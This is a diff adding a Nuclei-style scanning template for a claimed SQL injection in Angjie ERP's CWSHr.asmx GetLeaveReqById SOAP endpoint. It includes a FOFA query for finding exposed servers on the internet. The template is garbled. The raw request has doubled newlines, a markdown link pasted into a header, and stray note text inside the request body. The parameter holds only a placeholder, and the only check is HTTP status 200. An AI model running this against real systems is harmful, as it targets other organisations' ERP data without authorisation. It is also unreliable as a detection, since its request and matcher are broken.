@@ -1,0 +1,19 @@
+id: poc-ehsu4t6k2aw1y84l
+info:
+  name: 昂捷ERP SQL注入点
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ehsu4t6k2aw1y84l'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ehsu4t6k2aw1y84l
+    fofa: body="CheckSilverlightInstalled"
+http:
+- raw:
+  - "POST /EnjoyRMIS_WS/WS/Hr/CWSHr.asmx HTTP/1.1\n\nCache-Control: max-age=0\n\nUpgrade-Insecure-Requests: 1\n\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\n\nAccept-Encoding: gzip, deflate\n\nAccept-Language: zh-CN,zh;q=0.9\n\nConnection: close\n\nSOAPAction: [http://tempuri.org/GetLeaveReqById](http://tempuri.org/GetLeaveReqById)\n\nContent-Type: text/xml;charset=UTF-8\n\n\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n\n   <soapenv:Header/>\n\n   <soapenv:Body>\n\n      <tem:GetLeaveReqById>\n\n         <!--type: string-->\n\n         <tem:sId>gero et</tem:sId>\n\n      </tem:GetLeaveReqById>\n\n   </soapenv:Body>\n\n</soapenv:Envelope>\n\n# 响应代码特征\n200\n\n# 响应内容特征\n暂无\n\n# 上传文件定位\n暂无"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
